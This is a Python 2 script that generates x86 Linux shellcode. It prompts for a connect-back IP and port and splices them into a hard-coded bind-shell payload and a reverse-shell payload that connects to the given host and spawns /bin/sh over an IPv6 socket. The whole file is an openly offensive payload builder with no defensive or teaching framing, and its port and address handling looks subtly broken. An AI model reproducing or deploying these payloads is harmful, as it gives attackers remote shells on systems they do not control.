import socket
import struct
import string

def convert_ip(ip):
	
	ip1 = ''.join([hex(int(x)+256)[3:] for x in ip.split('.')])
	endian = int(ip1,16)
	
	print "\nHEX: "+"0x"+ip1
	
	ip2 = "\\x"+ip1[6:8]+"\\x"+ip1[4:6]+"\\x"+ip1[2:4]+"\\x"+ip1[:2]
	print ip+" has been converted to little-endian"+ip2
	
	return ip2
	
def convert_port(port):
	port1 = hex(port)
	port2 = str("\\x"+port1[2:4]+"\\x"+port1[4:6])
	print "PORT "+str(port)+" has been converted to "+"\\x"+port1[2:4]+"\\x"+port1[4:6]+"\\n"
	
	return port2

if __name__ == '__main__':
	
	ip = raw_input("Enter the IP to connect-back: ")
	port = raw_input("Enter the PORT: ")
	
	ip3 = convert_ip(str(ip))
	port3 = convert_port(int(port))
	
	print "Choose your shellcode \n\n"
	
	bind_shell = ("\\x6a\\x66\\x58\\x31\\xdb\\x6a\\x06\\x6a\\x01\\x6a\\x0a\\x43\\x89\\xe1\\xcd\\x80\\x96\\x31\\xc0\\x50\\x50\\x50\\x50\\x50\\x66\\x68"+port3+"\\x66\\x6a\\x0a\\x89\\xe1\\x6a\\x1c\\x51\\x56\\x89\\xe1\\x43\\x6a\\x66\\x58\\xcd\\x80\\x53\\x56\\x89\\xe1\\x43\\x43\\x6a\\x66\\x58\\xcd\\x80\\x99\\x52\\x52\\x56\\x89\\xe1\\x43\\x6a\\x66\\x58\\xcd\\x80\\x93\\x6a\\x02\\x59\\x6a\\x3f\\x58\\xcd\\x80\\x49\\x79\\xf8\\x31\\xc9\\x51\\x6a\\x0b\\x58\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80")
	print "Your Bind shell for IPv6 socket has been configured successfully: "+bind_shell+" \n\n"
	
	reverse_shell = ("\\x6a\\x66\\x58\\x31\\xdb\\x6a\\x06\\x6a\\x01\\x6a\\x0a\\x43\\x89\\xe1\\xcd\\x80\\x96\\x31\\xc0\\x50\\x68"+ip3+"\\x66\\x6a\\xff\\x50\\x50\\x66\\x50\\x50\\x66\\x68"+port3+"\\x66\\x6a\\x0a\\x89\\xe1\\x6a\\x1c\\x51\\x56\\x89\\xe1\\x43\\x43\\x6a\\x66\\x58\\xcd\\x80\\x6a\\x02\\x59\\x6a\\x3f\\x58\\xcd\\x80\\x49\\x79\\xf8\\x31\\xc9\\x51\\x6a\\x0b\\x58\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80")
	print "Your Reverse shell for IPv6 socket has been configured successfully: "+reverse_shell+" \n\n"
